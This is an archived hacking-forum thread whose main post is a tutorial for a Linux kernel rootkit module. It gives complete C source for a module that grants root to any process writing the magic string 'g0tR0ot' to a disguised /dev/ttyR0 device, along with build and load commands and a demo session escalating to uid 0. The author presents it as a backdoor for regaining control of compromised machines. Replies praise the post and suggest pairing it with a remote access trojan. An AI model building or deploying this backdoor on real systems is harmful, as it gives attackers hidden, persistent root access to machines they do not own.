<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Kernel RootKits. Getting your hands dirty - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massi&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="1485.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Kernel RootKits. Getting your hands dirty&#39;" href="1485.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/4/4ea21c43cc52082c9f6b485c2fa28ced709bd673.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/4/4ea21c43cc52082c9f6b485c2fa28ced709bd673.png" />
<meta property="og:url" content="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485" />
<meta name="twitter:url" content="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485" />
<meta property="og:title" content="Kernel RootKits. Getting your hands dirty" />
<meta name="twitter:title" content="Kernel RootKits. Getting your hands dirty" />
<meta property="og:description" content="Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel module. I bet you had already build a couple of bots and, at least, one of those useless frameworks… after all you can do that on python or javascript… but the real thing… you have to do in C ..." />
<meta name="twitter:description" content="Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel module. I bet you had already build a couple of bots and, at least, one of those useless frameworks… after all you can do that on python or javascript… but the real thing… you have to do in C ..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="linux" />
<meta property="og:article:tag" content="malware" />
<meta property="og:article:tag" content="rootkit" />
<meta property="og:article:tag" content="kernel" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="3 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="41 ❤" />
<meta property="article:published_time" content="2017-01-24T18:29:08+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="1485.html">Kernel RootKits. Getting your hands dirty</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/linux.html" class="discourse-tag" rel="tag">linux</a>,
<a href="../../tag/malware.html" class="discourse-tag" rel="tag">malware</a>,
<a href="../../tag/rootkit.html" class="discourse-tag" rel="tag">rootkit</a>,
<a href="../../tag/kernel.html" class="discourse-tag" rel="tag">kernel</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Kernel RootKits. Getting your hands dirty">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content="linux, malware, rootkit, kernel">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/4/4ea21c43cc52082c9f6b485c2fa28ced709bd673.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-24T18:29:08Z" class="post-time">
January 24, 2017, 6:29pm
</time>
<meta itemprop="dateModified" content="2017-01-25T06:36:58Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome Linux kernel module. I bet you had already build a couple of bots and, at least, one of those useless frameworks… after all you can do that on python or javascript… but the real thing… you have to do in C <img src="../../images/emoji/twitter/stuck_out_tongue.png%3Fv=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
<h1>Getting Started</h1>
<p>Let’s start with a very simple LKM that will allow us to get instant root on whatever machine we install it. Consider it as a quick way to re-gain control of a machine once it was compromised. This is one of the standard functions you’ll find in a rootkit.</p>
<p>For writing this LKM I used the following great resources. Go and read them. I’m not going to repeat what is in there… specially because I couldn’t do it better.</p>
<p><aside class="onebox allowlistedgeneric">
<header class="source">
<img src="http://derekmolloy.ie/wp-content/uploads/2013/05/seriesyonkis.ico" class="site-icon" width="32" height="32">
<a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-1-introduction/" target="_blank" rel="noopener nofollow ugc">derekmolloy.ie</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4ea21c43cc52082c9f6b485c2fa28ced709bd673.png" class="thumbnail" width height>
<h3><a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-1-introduction/" target="_blank" rel="noopener nofollow ugc">Writing a Linux Kernel Module — Part 1: Introduction | derekmolloy.ie</a></h3>
<p>Guide to writing loadable kernel modules (LKMs) for embedded Linux devices (e.g., BeagleBone). Part 1 builds a "hello world" code example with custom parameters</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="http://derekmolloy.ie/wp-content/uploads/2013/05/seriesyonkis.ico" class="site-icon" width="32" height="32">
<a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-2-a-character-device/" target="_blank" rel="noopener nofollow ugc">derekmolloy.ie</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4ea21c43cc52082c9f6b485c2fa28ced709bd673.png" class="thumbnail" width height>
<h3><a href="http://derekmolloy.ie/writing-a-linux-kernel-module-part-2-a-character-device/" target="_blank" rel="noopener nofollow ugc">Writing a Linux Kernel Module — Part 2: A Character Device | derekmolloy.ie</a></h3>
<p>Guide to writing loadable kernel modules (LKMs) for embedded Linux devices (e.g., BeagleBone). Part 2 builds a character driver for 3.x.x kernel devices.</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
<a href="https://github.com/typoon/lkms/tree/master/genesis" target="_blank" rel="noopener nofollow ugc">GitHub</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e092731d83213375f887ed36a6ab26862a0b6951.png" class="thumbnail" width height>
<h3><a href="https://github.com/typoon/lkms/tree/master/genesis" target="_blank" rel="noopener nofollow ugc">typoon/lkms</a></h3>
<p>Linux kernel modules developed by me for learning purposes - typoon/lkms</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
</p>
<p>The first two are great tutorials on the basics. The third is a module that does what we want, but didn’t worked for me at first and I had to modified it to get a functional version. The one I will show you in a while.</p>
<h1>Internals</h1>
<p>Giving root to a process is as easy as updating its associated credentials. However, we need a way to let the kernel know which process we want to grant those credentials to. There are different ways to interchange information between user space and kernel space. The traditional <code>ioctl</code>, the <code>proc</code> pseudo file system or a device driver among others. The last two have the extra advantage that can be easily accessed from the command line. We will be using a device driver for our example. (try to change it to use the <code>proc</code> file system as an exercise).</p>
<p>The thing is pretty simple, when a process writes a magic string to our special device, our LKM will give root credentials to such process. You can change this approach in many different ways. For instance, another classical way of doing this is writing the <code>PID</code> of the process you want to grant permissions.</p>
<h1>The LKM</h1>
<p>So, this is the code:</p>
<pre><code class="lang-auto">#include &lt;linux/init.h&gt;   
#include &lt;linux/module.h&gt; 
#include &lt;linux/kernel.h&gt;
#include &lt;linux/device.h&gt;
#include &lt;linux/fs.h&gt;    
#include &lt;asm/uaccess.h&gt;
#include &lt;linux/slab.h&gt;
#include &lt;linux/syscalls.h&gt;
#include &lt;linux/types.h&gt;
#include &lt;linux/cdev.h&gt;
#include &lt;linux/cred.h&gt;
#include &lt;linux/version.h&gt;

#define  DEVICE_NAME "ttyR0" 
#define  CLASS_NAME  "ttyR"  

#if LINUX_VERSION_CODE &gt; KERNEL_VERSION(3,4,0)
#define V(x) x.val
#else
#define V(x) x
#endif

// Prototypes
static int     __init root_init(void);
static void    __exit root_exit(void);
static int     root_open  (struct inode *inode, struct file *f);
static ssize_t root_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off);


// Module info
MODULE_LICENSE("GPL"); 
MODULE_AUTHOR("pico");
MODULE_DESCRIPTION("Got r00t!."); 
MODULE_VERSION("0.1"); 

static int            majorNumber; 
static struct class*  rootcharClass  = NULL;
static struct device* rootcharDevice = NULL;

static struct file_operations fops =
{
  .owner = THIS_MODULE,
  .open = root_open,
  .read = root_read,
  .write = root_write,
};

static int
root_open (struct inode *inode, struct file *f)
{
   return 0;
}

static ssize_t
root_read (struct file *f, char *buf, size_t len, loff_t *off)
{
  return len;
}

static ssize_t
root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{ 
  char   *data;
  char   magic[] = "g0tR0ot";
  struct cred *new_cred;
  
  data = (char *) kmalloc (len + 1, GFP_KERNEL);
    
  if (data)
    {
      copy_from_user (data, buf, len);
        if (memcmp(data, magic, 7) == 0)
	  {
	    if ((new_cred = prepare_creds ()) == NULL)
	      {
		printk ("ttyRK: Cannot prepare credentials\n");
		return 0;
	      }
	    printk ("ttyRK: You got it.\n");
	    V(new_cred-&gt;uid) = V(new_cred-&gt;gid) =  0;
	    V(new_cred-&gt;euid) = V(new_cred-&gt;egid) = 0;
	    V(new_cred-&gt;suid) = V(new_cred-&gt;sgid) = 0;
	    V(new_cred-&gt;fsuid) = V(new_cred-&gt;fsgid) = 0;
	    commit_creds (new_cred);
	  }
        kfree(data);
      }
    else
      {
	printk(KERN_ALERT "ttyRK:Unable to allocate memory");
      }
    
    return len;
}


static int __init
root_init(void)
{
  printk ("ttyRK: LKM installed!\n");
  // Create char device
  if ((majorNumber = register_chrdev(0, DEVICE_NAME, &amp;fops)) &lt; 0)
    {
      printk(KERN_ALERT "ttyRK failed to register a major number\n");
      return majorNumber;
    }
   printk(KERN_INFO "ttyRK: major number %d\n", majorNumber);
 
   // Register the device class
   rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(rootcharClass))
     {
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT "ttyRK: Failed to register device class\n");
       return PTR_ERR(rootcharClass); 
   }

   printk(KERN_INFO "ttyRK: device class registered correctly\n");
 
   // Register the device driver
   rootcharDevice = device_create(rootcharClass, NULL,
				  MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
   if (IS_ERR(rootcharDevice))
     {
       class_destroy(rootcharClass);
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT "ttyRK: Failed to create the device\n");
       return PTR_ERR(rootcharDevice);
     }

    return 0;
    
}

static void __exit
root_exit(void) 
{
  // Destroy the device
  device_destroy(rootcharClass, MKDEV(majorNumber, 0));
  class_unregister(rootcharClass);                     
  class_destroy(rootcharClass);                        
  unregister_chrdev(majorNumber, DEVICE_NAME);     

  printk("ttyRK:Bye!\n");
}


module_init(root_init);
module_exit(root_exit);

</code></pre>
<p>If you had read the links I posted above, the code is self-explanatory. Otherwise, go and read them. The relevant part of the module is the <code>write</code> function. It gets the user space string that the process is trying to write to the device and compares it with a keyword. If it matches, the credentials are updated.</p>
<pre><code class="lang-auto">	    if ((new_cred = prepare_creds ()) == NULL)
	      {
		printk ("ttyRK: Cannot prepare credentials\n");
		return 0;
	      }
	    printk ("ttyRK: You got it.\n");
	    V(new_cred-&gt;uid) = V(new_cred-&gt;gid) =  0;
	    V(new_cred-&gt;euid) = V(new_cred-&gt;egid) = 0;
	    V(new_cred-&gt;suid) = V(new_cred-&gt;sgid) = 0;
	    V(new_cred-&gt;fsuid) = V(new_cred-&gt;fsgid) = 0;
	    commit_creds (new_cred);
</code></pre>
<p>As for kernel 3.4, the credential structure fields changed and that is why I have to use the macro. Check the macro definition at the beginning of the program. I had to navigate the <a href="http://lxr.linux.no/#linux+v4.9.5/" rel="noopener nofollow ugc">LXR</a> a bit to find the proper structures and functions to call and which kernel version changed the <code>struct cred</code> (to write the conditional macro at the beginning of the code).</p>
<p>There are other ways of getting the same behaviour but I leave that to you to explore. An interesting one is the technique used by the Mr Fontanini’s rootkit (<a href="https://github.com/mfontanini/Programs-Scripts/tree/master/rootkit" rel="noopener nofollow ugc">https://github.com/mfontanini/Programs-Scripts/tree/master/rootkit</a>). Haven’t checked whether still works on recent kernels so it is something interesting for you to also try.</p>
<p>In case you haven’t read the links above (really, go and read them). This is the make file to build this module… The standard one</p>
<pre><code class="lang-auto">obj-m+=root.o

all:
        make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules
clean:
        make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean

</code></pre>
<h1>How to use this module</h1>
<p>So, you have type it and compile it. It’s time to try it.</p>
<p>First open a terminal to monitor the kernel log</p>
<pre><code>$ tail -f /var/log/kern.log
</code></pre>
<p><em>(The kernel log may be in a different file in your system. Check your distro documentation)</em></p>
<p>Then we can load the module</p>
<pre><code>sudo insmod ./root.ko
</code></pre>
<p>The log window will shown the initialisation messages and a new device will pop up under the <code>/dev</code> folder. Something called <code>/dev/ttyR0</code>. If you list the folder you will find a bunch of <code>ttySOMETHING</code> in there… our character device will be difficult to spot at first glance (we will see how to completely hide it a future instalment… hopefully).</p>
<p>By default the device is only accessible by root so we need to change the permissions after loading our module</p>
<pre><code>$ sudo chmod 0666 /dev/ttyR0
</code></pre>
<p>Another interesting exercise is to modify the module so the device is created with the permissions we want.</p>
<p>Now we can use our root backdoor at any time from any terminal or program:</p>
<pre><code>$ id
uid=1000(pico) gid=1000(pico) groups=1000(pico)
$ echo "g0tR0ot" &gt; /dev/ttyR0
$ id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>There is a lot of things you can try out of this simple example… So, what are you waiting for?</p>
<p>Hack Fun</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="24" />
<span class="post-likes">24 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../hiding-with-a-linux-rootkit/4532.html">Hiding with a Linux Rootkit</a>
<meta itemprop="position" content="6">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Joe_Schmoe"><span itemprop="name">Joe_Schmoe</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-24T23:40:45Z" class="post-time">
January 24, 2017, 11:40pm
</time>
<meta itemprop="dateModified" content="2017-01-24T23:40:45Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I know this is probably a really basic thing, but it’s still awesome! Thanks for sharing.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/oaktree"><span itemprop="name">oaktree</span></a>
(oaktree)
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-25T01:47:56Z" class="post-time">
January 25, 2017, 1:47am
</time>
<meta itemprop="dateModified" content="2017-01-25T01:47:56Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote no-group" data-username="0x00pf" data-post="1" data-topic="1485">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>write your own IRC bot, create a massive framework that only you will ever use and code an awesome Linux kernel module.</p>
</blockquote>
</aside>
<p>Two down; one to go!!!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="5" />
<span class="post-likes">5 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-25T13:25:02Z" class="post-time">
January 25, 2017, 1:25pm
</time>
<meta itemprop="dateModified" content="2017-01-25T13:25:02Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Pico the wizard. You did it again. Nice share duuude. Rootkits to the moon!</p>
<p>I think its time to write a rookit with a RAT eh?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-25T22:36:38Z" class="post-time">
January 25, 2017, 10:36pm
</time>
<meta itemprop="dateModified" content="2017-01-25T22:36:38Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote group-VIP" data-username="pry0cc" data-post="4" data-topic="1485">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/pry0cc/40/6_2.png" class="avatar"> pry0cc:</div>
<blockquote>
<p>I think its time to write a rookit with a RAT eh?</p>
</blockquote>
</aside>
<p>Sounds like an interesting project to learn about a lot of topics!. Let’s try <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Pwned08000202"><span itemprop="name">Pwned08000202</span></a>
(0xffxd)
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-05-22T01:05:01Z" class="post-time">
May 22, 2017, 1:05am
</time>
<meta itemprop="dateModified" content="2017-05-22T18:56:10Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hello everyone,</p>
<p>Thank you Pico for this article! It’s very useful<br>
Has anyone ever had this type of problem?<br>
I already install the linux-headers…<br>
If a person has an idea thank you</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-05-22T05:47:33Z" class="post-time">
May 22, 2017, 5:47am
</time>
<meta itemprop="dateModified" content="2017-05-22T05:47:33Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi <a class="mention" href="https://0x00sec.org/u/pwned08000202">@Pwned08000202</a></p>
<p>A quick copy and paste of your error on Google shows that you may have be using <code>pwd</code> (lowercase) instead of <code>PWD</code> (uppercase) in your Makefile.</p>
<p>Other than that I have no idea… Usually you only need the kernel source (kernel headers) to compile your module.</p>
<p>Hope this help</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Pwned08000202"><span itemprop="name">Pwned08000202</span></a>
(0xffxd)
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-05-23T21:07:15Z" class="post-time">
May 23, 2017, 9:07pm
</time>
<meta itemprop="dateModified" content="2017-05-23T21:07:15Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks for your reply.<br>
It works now<br>
I uninstall and install again kernel headers and done</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Pwned08000202"><span itemprop="name">Pwned08000202</span></a>
(0xffxd)
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-04T13:52:34Z" class="post-time">
June 4, 2017, 1:52pm
</time>
